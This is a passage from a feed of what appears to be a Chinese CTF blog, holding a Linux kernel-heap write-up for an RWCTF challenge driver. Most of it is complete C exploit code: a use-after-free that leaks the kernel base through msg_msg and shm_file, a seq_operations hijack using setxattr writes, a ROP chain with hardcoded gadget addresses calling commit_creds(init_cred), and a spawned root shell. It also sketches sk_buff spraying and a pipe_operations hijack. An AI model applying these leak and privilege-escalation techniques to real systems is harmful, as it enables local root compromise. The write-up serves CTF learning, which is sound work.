class="string">&quot;mov r13, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://s2.loli.net/2023/01/21/h6KfLTtcP1vMUyC.png" alt=""></p><h3 id="利用setxattr进行写"><a href="#利用setxattr进行写" class="headerlink" title="利用setxattr进行写"></a>利用setxattr进行写</h3><p><code>setxattr</code>可以为我们提供近乎任意大小的内核空间object分配，其调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>在setxattr函数中有如下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span></span><br><span class="line">setxattr(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span><br><span class="line">     <span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用的方法就是类似这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(&quot;&#x2F;exp1&quot;, &quot;Photon&quot;, buf, 0x20, 0)</span><br></pre></td></tr></table></figure><p>倒数第二个参数是申请object的大小，buf是内容。</p><p>对于UAF来说，通过这个系统调用我们可以很方便的对某个free的object进行更改。但是之后这个object又会被放入free list,这会造成在offset偏移处写上某个指针(放入free list的object通过链表形式连在一起，类似用户态下的chunk，但是不一定是在头8个字节，似乎是根据object的大小而定的offset偏移处)。所以这个系统调用经常和<code>userfaultfd</code>一起使用,也就是俗称的<strong>堆占位</strong>技术。我还没有学习这个技术，不过听说userfaultfd在较新版本的内核当中变成了只有root才能使用的，所以可用性降低了许多。关于这个技术后面有时间学习一下写一篇blog整理一下。</p><p>用<code>setxattr</code>进行写的方法和题目给的写方法其实差不多。但是我实际测试的时候发现需要将之前释放的<code>shm_file</code>再申请上，不然后面执行system的时候会报<code>__kmalloc</code>的时候引用非法地址的错误</p><p>其exp和之前的大差不差，基本上就是把题目给的写操作换成了setxattr</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%lx&quot;,((uint64_t*)recv)[0x1fb]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getR00t</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Fail to get root\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Success!!! root now\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span>* buf = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);<span class="comment">//需要申请回来</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = ADD_RSP_VAL_RET+offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;???---&gt;%d&quot;</span>,setxattr(<span class="string">&quot;/exp1&quot;</span>, <span class="string">&quot;Photon&quot;</span>, buf, <span class="number">0x20</span>, <span class="number">0</span>));<span class="comment">//写上了object，但是出错了？？？__kmalloc的时候r12和rax设置有问题</span></span><br><span class="line">    <span class="comment">//add(1,0x20,buf);</span></span><br><span class="line">    pop_rdi_ret = POP_RDI_RET+offset;</span><br><span class="line">    init_cred = INIT_CRED+offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS+offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+offset;</span><br><span class="line">    </span><br><span class="line">    Doing(<span class="string">&quot;Start Trigger&quot;</span>);</span><br><span class="line">    <span class="comment">//read(seq_fd,data,0x20);</span></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://s2.loli.net/2023/01/23/5y7XrNMJUi9guWH.png" alt=""></p><h3 id="利用sk-buff进行写"><a href="#利用sk-buff进行写" class="headerlink" title="利用sk_buff进行写"></a>利用sk_buff进行写</h3><p>sk_buff也同样可以提供任意大小对象的分配写入与释放，但是sk_buff本身不含任何用户数据，游湖数据被单独放在一个object中，然后由sk_buff中存放指向这个object的指针来管理。</p><p><img src="https://s2.loli.net/2023/01/27/r3atGL5O1MAXiT7.png" alt=""></p><p>sk_buff在内核协议栈中代表一个包，所以我们只需要创建一对socket，然后在上面发送接收数据包就可以实现sk_buff的分配与释放。比如我们可以用socketpair系统调用创建一对socket，然后进行read和write</p><p>对于本题如果想要劫持0x20的seq_operation的话这样做应该是行不通的，因为在内核中的用户data的object大小并不是我们指定的大小，而是还需要加上一个<code>SKB_SHARED_INFO_SIZE</code> ，这个部分称作分片结构，其大小为0x140。<code>skb_shared_info</code>分片结构和sk_buff的线性数据区内存分配及销毁时都是一起的。所以如果我们想要写SIZE大小的object，我们需要构造SIZE-0x140大小的buff数据才行。sk_buff行为如下图所示。headroom+data+tailroom部分为线性数据区，skb_shared_info为分片结构</p><p><img src="https://s2.loli.net/2023/01/27/wHfbFgM64qISkZv.png" alt=""></p><p>所以在本题中，如果我们想要用sk_buff进行改写operation，我们需要选择其他可以利用的结构体，满足条件至少为大小大于0x140。</p><p>这里可以采用的方法是利用泄露内核堆地址，然后劫持pipe_operation的函数表地址，在堆上伪造函数表进行ROP。这个方法和之后整理的D3CTF当中的D3HEAP方法类似，所以挪到那个地方讲，如果有空的话再在这题试一下</p><h1 id="D3CTF2022-D3heap"><a href="#D3CTF2022-D3heap" class="headerlink" title="[D3CTF2022]D3heap"></a>[D3CTF2022]D3heap</h1><p>等待施工…..</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 - arttnba3’s blog</a></p><p><a href="https://www.anquanke.com/post/id/253478#h2-2">CVE-2017-6074 DCCP拥塞控制协议Double-Free提权分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解&lt;/p&gt;
&lt;h1 id=&quot;slub分配&quot;&gt;&lt;a href=&quot;#slub分配&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CatCTF2022</title>
    <link href="http://phot0n.com/2023/01/02/CatCTF2022/"/>
    <id>http://phot0n.com/2023/01/02/CatCTF2022/</id>
    <published>2023-01-02T08:02:03.000Z</published>
    <updated>2023-02-15T13:40:26.780Z</updated>
    
